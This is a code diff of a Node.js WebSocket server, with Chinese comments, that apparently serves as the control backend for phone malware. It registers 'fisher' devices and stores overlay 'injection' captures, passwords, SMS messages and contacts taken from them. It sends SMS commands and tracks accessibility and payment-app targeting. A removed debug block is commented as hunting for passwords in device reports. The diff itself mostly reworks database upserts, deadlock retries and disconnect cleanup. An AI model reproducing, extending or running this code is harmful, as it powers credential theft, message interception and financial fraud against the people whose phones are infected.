+        await handleDeviceMessage(ws, msg, sessionId, connections);
       } catch (err) {
         console.error(`[WS-Device] Parse error from ${sessionId}:`, err.message);
       }
@@ -737,63 +189,47 @@ function handleDevice(ws, sessionId, connections) {
     return cur && cur.ws === ws;
   }
 
-  let connectionFinished = false;
-  function finishConnection() {
-    if (connectionFinished) return;
-    connectionFinished = true;
-    tasks.cleanup();
+  ws.on('close', () => {
+    clearTimeout(appListTimer);
+    policySyncTimers.forEach(clearTimeout);
     clearInterval(heartbeatInterval);
     clearInterval(serverPingInterval);
-    if (!isCurrentDeviceConnection()) return;
+    if (!isCurrentDeviceConnection()) return;  // ★ 不是自己的连接（已被新连接覆盖），不清理
     connections.devices.delete(sessionId);
-    cancelPendingOffline(lifecycle, sessionId);
-    const finalizeOffline = () => {
-      lifecycle.pendingOffline.delete(sessionId);
-      if (connections.devices.has(sessionId)) return;
-      clearDeviceFrameState(sessionId);
-      autoInjectedCache.delete(sessionId);
-      const bridgeOnline = connections.bridges.has(sessionId);
-      if (!bridgeOnline) updateDeviceStatus(sessionId, false);
-      broadcastToAdmins(connections, {
-        type: 'device_offline',
-        sessionId,
-        deviceId: sessionId,
-        data: { status: bridgeOnline ? 'online' : 'offline' },
-      });
-      if (!bridgeOnline) {
-        broadcastToAdmins(connections, { type: 'bot_offline', sessionId, deviceId: sessionId, botId: sessionId });
-      }
-      broadcastToAdmins(connections, { type: 'device_update' });
-      console.log(`[WS-Device] disconnected device=${sessionId} at=${new Date().toISOString()}`);
-    };
-    if (OFFLINE_GRACE_MS <= 0) {
-      finalizeOffline();
-      return;
+    // 只有当没有 bridge 连接时才标记为离线
+    if (!connections.bridges.has(sessionId)) {
+      updateDeviceStatus(sessionId, false);
     }
-    const offlineTimer = setTimeout(finalizeOffline, OFFLINE_GRACE_MS);
-    offlineTimer.unref?.();
-    lifecycle.pendingOffline.set(sessionId, offlineTimer);
-  }
+    broadcastToAdmins(connections, {
+      type: 'device_offline',
+      sessionId,
+      deviceId: sessionId,
+      data: { status: connections.bridges.has(sessionId) ? 'online' : 'offline' },
+    });
+    // 如果设备真正离线（无 bridge），发 bot_offline
+    if (!connections.bridges.has(sessionId)) {
+      broadcastToAdmins(connections, { type: 'bot_offline', sessionId, deviceId: sessionId, botId: sessionId });
+    }
+    broadcastToAdmins(connections, { type: 'device_update' });
+    console.log(`[WS-Device] Disconnected: ${sessionId}`);
+  });
 
-  connection.cleanup = finishConnection;
-  ws.on('close', finishConnection);
-  ws.on('error', finishConnection);
+  ws.on('error', () => {
+    clearTimeout(appListTimer);
+    policySyncTimers.forEach(clearTimeout);
+    clearInterval(heartbeatInterval);
+    clearInterval(serverPingInterval);
+    if (!isCurrentDeviceConnection()) return;  // ★ 归属校验，同上
+    connections.devices.delete(sessionId);
+    if (!connections.bridges.has(sessionId)) {
+      updateDeviceStatus(sessionId, false);
+    }
+  });
 }
 
-function handleDeviceMessage(ws, msg, sessionId, connections) {
-  // ★ DBG2 2026-09-12: 抓设备上报（重点找密码）
-  try {
-    const _t = String(msg && (msg.type || msg.event || '')).toLowerCase();
-    if (_t && !['ping','pong','heartbeat','device_heartbeat','screen_frame','screenshot','app_list_response','black_apps_updated','sensitive_apps_updated','payment_strategies_updated','injection_status'].includes(_t)) {
-      console.log(`[DEVMSG] ${sessionId} type=${msg.type || msg.event} :: ${JSON.stringify(msg).substring(0,400)}`);
-    }
-  } catch (e) {}
-
+async function handleDeviceMessage(ws, msg, sessionId, connections) {
   const { type } = msg;
-  const highVolume = isHighVolumeMessage(msg);
-  if (VERBOSE_DEVICE_MESSAGE_LOGS && !highVolume && !['heartbeat', 'HEARTBEAT', 'status', 'device_heartbeat'].includes(type)) {
-    console.log(`[WS-Device] handle device=${sessionId} type=${type || 'unknown'}`);
-  }
+  console.log(`[WS-Device] handleDeviceMessage type='${type}' from ${sessionId}`);
 
   // 旧后端逻辑：心跳/状态/注册消息都会触发设备信息更新
   const registerTypes = ['REGISTER', 'register', 'heartbeat', 'HEARTBEAT',
@@ -808,7 +244,7 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
     // ★ 修复 C：不再查池拿 clientIp（避免池被清空时丢失 IP），直接从 ws 取实时 IP
     const rawIp = ws._socket ? ws._socket.remoteAddress : '';
     const wsClientIp = rawIp ? rawIp.replace('::ffff:', '') : '';
-    queueDeviceStatusSync(connections, sessionId, info, wsClientIp);
+    syncDeviceStatus(sessionId, info, wsClientIp);
   }
 
   switch (type) {
@@ -824,6 +260,7 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
         broadcastToAdmins(connections, { type: 'password_status', deviceId: sessionId, sessionId });
       }
       // 状态更新，转发给管理端 + 更新数据库
+      console.log(`[WS-Device] >>>> Forwarding status '${type}' to admins from ${sessionId}`);
       broadcastToAdmins(connections, {
         ...msg,
         data: msg.data || msg.payload || {},
@@ -834,14 +271,10 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
 
     case 'command_result':
       // 命令结果，转发给管理端
-      const commandName = String(msg.data?.command || msg.data?.requestCommand || msg.data?.originalCommand || msg.command || 'unknown');
-      if (!highVolume) {
-        console.log(`[WS-Reply] device=${sessionId} type=command_result command=${commandName}`);
-      }
+      console.log(`[WS-Device] >>>> Forwarding command_result to admins from ${sessionId}:`, JSON.stringify(msg.data || msg).substring(0, 200));
       // 检测 command_result 中的短信/通讯录/应用数据并入库
       {
         const rd = msg.data || {};
-        const command = String(rd.command || rd.requestCommand || rd.originalCommand || rd.data?.command || '').toUpperCase();
         if (rd.smsList || rd.messages) {
           const sms = rd.smsList || rd.messages;
           if (Array.isArray(sms) && sms.length > 0) {
@@ -857,46 +290,28 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
             saveAiDeviceData(sessionId, 'contacts', ct);
           }
         }
-        if (command === 'GET_CONTACTS' || Array.isArray(rd.contacts)) {
-          const contactPayload = normalizeContactsPayload(msg);
-          broadcastToAdmins(connections, {
-            type: 'contacts_data',
-            deviceId: sessionId,
-            sessionId,
-            success: contactPayload.success,
-            contacts: contactPayload.contacts,
-            data: contactPayload,
-          });
-        }
-        if (command === 'SMS_SEND') {
-          const smsPayload = normalizeSmsSendPayload(msg);
-          broadcastToAdmins(connections, {
-            type: 'sms_send_result',
-            deviceId: sessionId,
-            sessionId,
-            success: smsPayload.success,
-            phoneNumber: smsPayload.phoneNumber,
-            data: smsPayload,
-          });
-        }
       }
-      const delivered = broadcastToAdmins(connections, {
+      broadcastToAdmins(connections, {
         type: 'command_result',
         deviceId: sessionId,
         data: msg.data || msg,
       });
-      if (!highVolume) {
-        console.log(`[WS-Reply] device=${sessionId} command=${commandName} delivered=${delivered}`);
-      }
       break;
 
     case 'injection':
     case 'injection_data':
-      // 注入数据上报 — 存入数据库 + 转发给管理端
+      // 注入数据上报 — 存入数据库 + 清除活跃任务 + 转发给管理端
       // 新格式: { type: 'injection', deviceId, data: {...}, packageName, timestamp }
       // data 可能是字符串或已解析对象
-      saveInjectionData(sessionId, msg);
-      broadcastToAdmins(connections, { ...msg, deviceId: sessionId });
+      await saveInjectionData(sessionId, msg);
+      // ★ 2026-10-12 修复：上报到数据说明注入已完成，清除 active_injection_tasks 残留记录
+      await clearActiveInjectionTask(sessionId, msg.packageName || '');
+      // ★ 广播 NEW_INJECTION_DATA（与 PHP /api/sync/form 路径保持一致），前端据此刷新
+      broadcastToAdmins(connections, {
+        type: 'NEW_INJECTION_DATA',
+        deviceId: sessionId,
+        packageName: msg.packageName || '',
+      });
       break;
 
     case 'NEW_PASSWORD':
@@ -964,43 +379,19 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
       }
       break;
 
-    case 'sms_send_result':
-    case 'SMS_SEND_RESULT':
-      {
-        const payload = normalizeSmsSendPayload(msg);
-        console.log(`[WS-Device] SMS submit result from ${sessionId}: phone=${payload.phoneNumber || '-'}, success=${payload.success}`);
-        broadcastToAdmins(connections, {
-          type: 'sms_send_result',
-          deviceId: sessionId,
-          sessionId,
-          success: payload.success,
-          phoneNumber: payload.phoneNumber,
-          data: payload,
-        });
-      }
-      break;
-
     case 'contacts':
     case 'CONTACTS':
     case 'contacts_data':
     case 'CONTACTS_DATA':
     case 'contacts_response':
-    case 'CONTACTS_RESPONSE':
       // 通讯录数据返回 → 存入 AI 数据缓存表 + 转发给管理端
       {
-        const payload = normalizeContactsPayload(msg);
-        console.log(`[WS-Device] Received contacts from ${sessionId}, success=${payload.success}, count=${payload.contacts.length}${payload.error ? `, error=${payload.error}` : ''}`);
-        if (payload.success && payload.contacts.length > 0) {
-          saveAiDeviceData(sessionId, 'contacts', payload.contacts);
+        const contacts = msg.data?.contacts || msg.contacts || msg.data || [];
+        console.log(`[WS-Device] Received contacts from ${sessionId}, count=${Array.isArray(contacts) ? contacts.length : 0}`);
+        if (Array.isArray(contacts) && contacts.length > 0) {
+          saveAiDeviceData(sessionId, 'contacts', contacts);
         }
-        broadcastToAdmins(connections, {
-          type: 'contacts_data',
-          deviceId: sessionId,
-          sessionId,
-          success: payload.success,
-          contacts: payload.contacts,
-          data: payload,
-        });
+        broadcastToAdmins(connections, { ...msg, type: 'contacts', deviceId: sessionId });
       }
       break;
 
@@ -1016,9 +407,7 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
 
     default:
       // 其他消息也转发
-      if (VERBOSE_DEVICE_MESSAGE_LOGS && !highVolume) {
-        console.log(`[WS-Device] >>>> Forwarding default msg to admins from ${sessionId}: type='${type}'`);
-      }
+      console.log(`[WS-Device] >>>> Forwarding default msg to admins from ${sessionId}: type='${type}'`);
       // 检测是否包含短信/通讯录数据（某些 APK 用非标准 type 返回）
       if (msg.data) {
         const d = msg.data;
@@ -1052,84 +441,126 @@ function handleDeviceMessage(ws, msg, sessionId, connections) {
  * is_charging, is_locked, accessibility_alive, public_ip
  */
 async function syncDeviceStatus(deviceId, data, clientIp) {
-  if (!data || !deviceId) return false;
+  if (!data || !deviceId) return;
   try {
     const db = getPool();
     const now = Math.floor(Date.now() / 1000);
-
-    // 检查设备是否存在
-    const [rows] = await db.query('SELECT id, public_ip, geo_location FROM fisher_devices WHERE device_id=?', [deviceId]);
-    const reportedIp = normalizeIp(data.publicIP || clientIp);
-    let shouldRefreshGeo = false;
-
-    if (!rows || rows.length === 0) {
-      // 设备不存在 → 自动注册（与旧 Python 后端一致）
-      // 只 INSERT 最基本信息 + status 消息中实际包含的数据
-      const insertFields = ['device_id', 'is_connected', 'last_seen', 'first_seen', 'created_at'];
-      const insertValues = [deviceId, 1, now, now, now];
-
-      // TG 上线通知由 handleDevice() 的异步连接事件触发，避免阻塞设备列表接口。
-
-      // 从 data 中提取实际存在的字段
-      if (data.brand) { insertFields.push('brand'); insertValues.push(String(data.brand)); }
-      if (data.model) { insertFields.push('model'); insertValues.push(String(data.model)); }
-      if (data.osVersion) { insertFields.push('os_version'); insertValues.push(String(data.osVersion)); }
-      if (data.appVersion) { insertFields.push('app_version'); insertValues.push(String(data.appVersion)); }
-      if (data.appName || data.deviceName) { insertFields.push('app_name'); insertValues.push(String(data.appName || data.deviceName)); }
-      if (isUsablePublicIp(reportedIp)) {
-        insertFields.push('public_ip');
-        insertValues.push(reportedIp);
-        shouldRefreshGeo = true;
-      }
-      if (data.batteryLevel !== undefined) { insertFields.push('battery_level'); insertValues.push(Number(data.batteryLevel) || 0); }
-      if (data.networkType !== undefined) { insertFields.push('network_type'); insertValues.push(String(data.networkType || '')); }
-      if (data.screenWidth > 0) { insertFields.push('screen_width'); insertValues.push(Number(data.screenWidth)); }
-      if (data.screenHeight > 0) { insertFields.push('screen_height'); insertValues.push(Number(data.screenHeight)); }
-      const placeholders = insertFields.map(() => '?').join(',');
-      await db.query(
-        `INSERT INTO fisher_devices (${insertFields.join(',')}) VALUES (${placeholders})`,
-        insertValues
-      );
-      console.log(`[WS-Device] Auto-registered new device: ${deviceId}`);
-    } else {
-      // 设备存在 → UPDATE（只更新消息中实际包含的字段）
-      const updates = { last_seen: now, is_connected: 1 };
-
-      if (data.brand) updates.brand = String(data.brand);
-      if (data.model) updates.model = String(data.model);
-      if (data.osVersion) updates.os_version = String(data.osVersion);
-      if (data.appVersion) updates.app_version = String(data.appVersion);
-      if (data.appName || data.deviceName) updates.app_name = String(data.appName || data.deviceName);
-      if (data.batteryLevel !== undefined) updates.battery_level = Number(data.batteryLevel) || 0;
-      if (data.networkType !== undefined) updates.network_type = String(data.networkType || '');
-      if (data.isScreenOn !== undefined) updates.is_screen_on = data.isScreenOn ? 1 : 0;
-      if (data.isCharging !== undefined) updates.is_charging = data.isCharging ? 1 : 0;
-      if (data.isLocked !== undefined) updates.is_locked = data.isLocked ? 1 : 0;
-      if (data.accessibilityAlive !== undefined) updates.accessibility_alive = data.accessibilityAlive ? 1 : 0;
-      const storedIp = normalizeIp(rows[0]?.public_ip);
-      if (isUsablePublicIp(reportedIp) && reportedIp !== storedIp) {
-        updates.public_ip = reportedIp;
-        // 只有公网 IP 真正变化时才失效地理位置缓存；普通心跳不能清空它。
-        if (storedIp) updates.geo_location = '';
-        shouldRefreshGeo = true;
-      } else if (isUsablePublicIp(reportedIp) && !rows[0]?.geo_location) {
-        shouldRefreshGeo = true;
-      }
-      if (data.screenWidth > 0) updates.screen_width = Number(data.screenWidth);
-      if (data.screenHeight > 0) updates.screen_height = Number(data.screenHeight);
-      if (data.permissions && typeof data.permissions === 'object') updates.permissions = JSON.stringify(data.permissions);
-
-      const setClauses = Object.keys(updates).map(k => `${k}=?`).join(', ');
-      const values = [...Object.values(updates), deviceId];
-      await db.query(`UPDATE fisher_devices SET ${setClauses} WHERE device_id=?`, values);
+    const shortId = String(deviceId).substring(0, 12);
+    if (await isDeviceDeleted(db, deviceId)) {
+      console.log(`[WS-Device] Ignore status from deleted device: ${shortId}...`);
+      return;
     }
-    if (shouldRefreshGeo) {
-      refreshDeviceGeo(deviceId, reportedIp).catch(() => {});
+
+    // ★ 2026-09-03 死锁修复：用单条 INSERT ... ON DUPLICATE KEY UPDATE 代替"先 SELECT 再分支 INSERT/UPDATE"
+    // ★ 2026-09-03 NOT NULL 修复：
+    //   - 两套变量：*InsV 用于 INSERT 侧（NOT NULL 列必须给安全默认值，不能写 NULL）
+    //               *UpdV 用于 UPDATE 侧判断条件（保留 NULL = 跳过不更新，避免覆盖原值）
+    const brandV        = data.brand ? String(data.brand) : null;
+    const modelV        = data.model ? String(data.model) : null;
+    const osVersionV    = data.osVersion ? String(data.osVersion) : null;
+    const appVersionV   = data.appVersion ? String(data.appVersion) : null;
+    const appNameV      = (data.appName || data.deviceName) ? String(data.appName || data.deviceName) : null;
+    const publicIpFromMsg = data.publicIP ? String(data.publicIP) : null;
+    const publicIpV     = publicIpFromMsg || clientIp || null;
+
+    // batteryLevel: NOT NULL 默认 0
+    const batteryUpdV   = data.batteryLevel !== undefined ? (Number(data.batteryLevel) || 0) : null;
+    const batteryInsV   = batteryUpdV === null ? 0 : batteryUpdV;
+    // networkType: NOT NULL 默认 ''
+    const networkTypeUpdV = data.networkType !== undefined ? String(data.networkType || '') : null;
+    const networkTypeInsV = networkTypeUpdV === null ? '' : networkTypeUpdV;
+    // 布尔/0-1 类 NOT NULL 默认 0
+    const isScreenOnUpdV = data.isScreenOn !== undefined ? (data.isScreenOn ? 1 : 0) : null;
+    const isScreenOnInsV = isScreenOnUpdV === null ? 0 : isScreenOnUpdV;
+    const isChargingUpdV = data.isCharging !== undefined ? (data.isCharging ? 1 : 0) : null;
+    const isChargingInsV = isChargingUpdV === null ? 0 : isChargingUpdV;
+    const isLockedUpdV   = data.isLocked !== undefined ? (data.isLocked ? 1 : 0) : null;
+    const isLockedInsV   = isLockedUpdV === null ? 0 : isLockedUpdV;
+    const accessibilityAliveUpdV = data.accessibilityAlive !== undefined ? (data.accessibilityAlive ? 1 : 0) : null;
+    const accessibilityAliveInsV = accessibilityAliveUpdV === null ? 0 : accessibilityAliveUpdV;
+    // screen_width / screen_height: NOT NULL 默认 0
+    const screenWidthUpdV  = data.screenWidth  > 0 ? Number(data.screenWidth)  : null;
+    const screenWidthInsV  = screenWidthUpdV  === null ? 0 : screenWidthUpdV;
+    const screenHeightUpdV = data.screenHeight > 0 ? Number(data.screenHeight) : null;
+    const screenHeightInsV = screenHeightUpdV === null ? 0 : screenHeightUpdV;
+
+    const permissionsV = data.permissions && typeof data.permissions === 'object' ? JSON.stringify(data.permissions) : null;
+
+    // geo 清空规则：只有当本次 public_ip 有值且与 DB 中不同时，才置空。
+    await dbWithRetry(
+      () => db.query(
+        `INSERT INTO fisher_devices
+         (device_id, is_connected, last_seen, first_seen, created_at,
+          brand, model, os_version, app_version, app_name, public_ip,
+          battery_level, network_type, is_screen_on, is_charging, is_locked, accessibility_alive,
+          screen_width, screen_height, permissions)
+         VALUES (?, 1, ?, ?, ?,
+                 ?, ?, ?, ?, ?, ?,
+                 ?, ?, ?, ?, ?, ?,
+                 ?, ?, ?)
+         ON DUPLICATE KEY UPDATE
+           is_connected  = 1,
+           last_seen     = ?,
+           brand         = IF(? IS NOT NULL, ?, brand),
+           model         = IF(? IS NOT NULL, ?, model),
+           os_version    = IF(? IS NOT NULL, ?, os_version),
+           app_version   = IF(? IS NOT NULL, ?, app_version),
+           app_name      = IF(? IS NOT NULL, ?, app_name),
+           public_ip     = IF(? IS NOT NULL, ?, public_ip),
+           geo_location  = IF(? IS NOT NULL AND ? <> COALESCE(public_ip, ''), '', geo_location),
+           battery_level = IF(? IS NOT NULL, ?, battery_level),
+           network_type  = IF(? IS NOT NULL, ?, network_type),
+           is_screen_on  = IF(? IS NOT NULL, ?, is_screen_on),
+           is_charging   = IF(? IS NOT NULL, ?, is_charging),
+           is_locked     = IF(? IS NOT NULL, ?, is_locked),
+           accessibility_alive = IF(? IS NOT NULL, ?, accessibility_alive),
+           screen_width  = IF(? IS NOT NULL, ?, screen_width),
+           screen_height = IF(? IS NOT NULL, ?, screen_height),
+           permissions   = IF(? IS NOT NULL, ?, permissions)`,
+        [
+          // INSERT side (NOT NULL cols use *InsV with safe defaults)
+          deviceId, now, now, now,
+          brandV, modelV, osVersionV, appVersionV, appNameV, publicIpV,
+          batteryInsV, networkTypeInsV, isScreenOnInsV, isChargingInsV, isLockedInsV, accessibilityAliveInsV,
+          screenWidthInsV, screenHeightInsV, permissionsV,
+          // ON DUPLICATE KEY UPDATE side (*UpdV with NULL = skip)
+          now,
+          brandV, brandV,
+          modelV, modelV,
+          osVersionV, osVersionV,
+          appVersionV, appVersionV,
+          appNameV, appNameV,
+          publicIpV, publicIpV,
+          publicIpV, publicIpV,
+          batteryUpdV, batteryUpdV,
+          networkTypeUpdV, networkTypeUpdV,
+          isScreenOnUpdV, isScreenOnUpdV,
+          isChargingUpdV, isChargingUpdV,
+          isLockedUpdV, isLockedUpdV,
+          accessibilityAliveUpdV, accessibilityAliveUpdV,
+          screenWidthUpdV, screenWidthUpdV,
+          screenHeightUpdV, screenHeightUpdV,
+          permissionsV, permissionsV,
+        ]
+      ),
+      { label: `syncDeviceStatus:${shortId}`, maxRetries: 3 }
+    );
+
+    // ★ 写节流标记：last_seen + status_meta（避免下一次心跳 UPDATE 在 10s/5s 内重复争同一行锁）
+    wtMark(deviceId, ['last_seen', 'status_meta', 'public_ip']);
+
+    // 首次注册的日志通过额外查询判断（只在 brand/model 都有值或首次无匹配行时才输出"Auto-registered"，
+    // 但为避免额外 SELECT 加重死锁，这里简化日志：不区分是否首次，只在 debug 模式下打印）
+    if (process.env.NODE_WS_DEBUG_SYNC === '1') {
+      console.log(`[WS-Device] syncDeviceStatus upserted: ${shortId}...`);
     }
-    return true;
   } catch (err) {
-    console.error('[WS-Device] syncDeviceStatus error:', err.message);
-    return false;
+    // 死锁/锁等待：已经由 dbWithRetry 内部打了 warn（可观测）；这里不再打 error，避免日志爆炸
+    if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
+      console.warn(`[WS-Device] syncDeviceStatus give up after retries (${shortId}...): ${err.message}`);
+    } else {
+      console.error('[WS-Device] syncDeviceStatus error:', err.message);
+    }
   }
 }
 
@@ -1172,6 +603,26 @@ async function saveInjectionData(deviceId, msg) {
     console.log(`[WS-Device] Saved injection_data from ${deviceId}: template=${templateName}, pkg=${packageName}`);
   } catch (err) {
     console.error('[WS-Device] saveInjectionData error:', err.message);
+  }
+}
+
+/**
+ * ★ 2026-10-12 修复：注入数据已上报 → 该包名的活跃注入任务视为完成，
+ * 清除 fisher_active_injection_tasks 残留记录，避免前端一直显示"注入中"
+ */
+async function clearActiveInjectionTask(deviceId, packageName) {
+  if (!deviceId || !packageName) return;
+  try {
+    const db = getPool();
+    const [result] = await db.query(
+      'DELETE FROM fisher_active_injection_tasks WHERE device_id=? AND package_name=?',
+      [deviceId, packageName]
+    );
+    if (result && result.affectedRows > 0) {
+      console.log(`[WS-Device] Cleared active_injection_task: ${deviceId} / ${packageName}`);
+    }
+  } catch (err) {
+    console.error('[WS-Device] clearActiveInjectionTask error:', err.message);
   }
 }
 
@@ -1292,30 +743,50 @@ async function updateDeviceStatus(deviceId, isConnected, clientIp) {
   try {
     const db = getPool();
     const now = Math.floor(Date.now() / 1000);
+    const shortId = String(deviceId).substring(0, 12);
     if (isConnected) {
       // 连接时先检查设备是否存在（可能是首次 WS 连接但还没发状态消息）
-      const [rows] = await db.query('SELECT id FROM fisher_devices WHERE device_id=?', [deviceId]);
+      // SELECT 与 UPDATE 分离，但 UPDATE 仍走死锁重试
+      const [rows] = await dbWithRetry(
+        () => db.query('SELECT id FROM fisher_devices WHERE device_id=?', [deviceId]),
+        { label: `updateDeviceStatus:SELECT:${shortId}`, maxRetries: 2 }
+      );
       if (rows && rows.length > 0) {
-        const normalizedClientIp = normalizeIp(clientIp);
-        const canStoreClientIp = isUsablePublicIp(normalizedClientIp);
-        const ipClause = canStoreClientIp ? ', public_ip=?' : '';
-        const params = canStoreClientIp
-          ? [now, now, normalizedClientIp, deviceId]
-          : [now, now, deviceId];
-        await db.query(
-          `UPDATE fisher_devices SET is_connected=1, connected_at=?, last_seen=?${ipClause} WHERE device_id=?`,
-          params
-        );
+        // 上线写 last_seen：走节流（如果 syncDeviceStatus 刚刷过，这里就跳过，减少一次争锁）
+        const shouldWriteLastSeen = wtAllow(deviceId, 'last_seen');
+        const shouldWriteIp = clientIp ? wtAllow(deviceId, 'public_ip') : false;
+        if (shouldWriteLastSeen || shouldWriteIp || true /* is_connected 状态变化必须写 */) {
+          const fields = ['is_connected=1', 'connected_at=?'];
+          const params = [now];
+          if (shouldWriteLastSeen) { fields.push('last_seen=?'); params.push(now); }
+          if (clientIp && shouldWriteIp) { fields.push('public_ip=?'); params.push(clientIp); }
+          params.push(deviceId);
+          await dbWithRetry(
+            () => db.query(`UPDATE fisher_devices SET ${fields.join(',')} WHERE device_id=?`, params),
+            { label: `updateDeviceStatus:ON:${shortId}`, maxRetries: 3 }
+          );
+          if (shouldWriteLastSeen) wtMark(deviceId, 'last_seen');
+          if (shouldWriteIp) wtMark(deviceId, 'public_ip');
+        }
       }
       // 如果不存在，等 syncDeviceStatus 来注册
     } else {
-      await db.query(
-        'UPDATE fisher_devices SET is_connected=0 WHERE device_id=?',
-        [deviceId]
+      // 下线：直接写 is_connected=0，不走节流（状态变化重要）
+      await dbWithRetry(
+        () => db.query(
+          'UPDATE fisher_devices SET is_connected=0 WHERE device_id=?',
+          [deviceId]
+        ),
+        { label: `updateDeviceStatus:OFF:${shortId}`, maxRetries: 3 }
       );
     }
   } catch (err) {
-    console.error('[WS-Device] DB error:', err.message);
+    // 死锁类错误降级为 warn（避免日志爆炸）
+    if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
+      console.warn(`[WS-Device] updateDeviceStatus ${isConnected ? 'ON' : 'OFF'} give up (${shortId}...): ${err.message}`);
+    } else {
+      console.error('[WS-Device] DB error:', err.message);
+    }
   }
 }
 
@@ -1511,18 +982,4 @@ async function saveSmsToMessages(deviceId, smsList) {
   }
 }
 
-module.exports = {
-  handleDevice,
-  handleDeviceMessage,
-  syncDeviceStatus,
-  queueDeviceStatusSync,
-  getDeviceLifecycleMetrics,
-  preflightDeviceUpgrade,
-  _test: {
-    createConnectionTaskTracker,
-    getDeviceLifecycleState,
-    claimConnectionInitialization,
-    cancelPendingOffline,
-    statusFingerprint,
-  },
-};
+module.exports = { handleDevice, handleDeviceMessage, syncDeviceStatus };
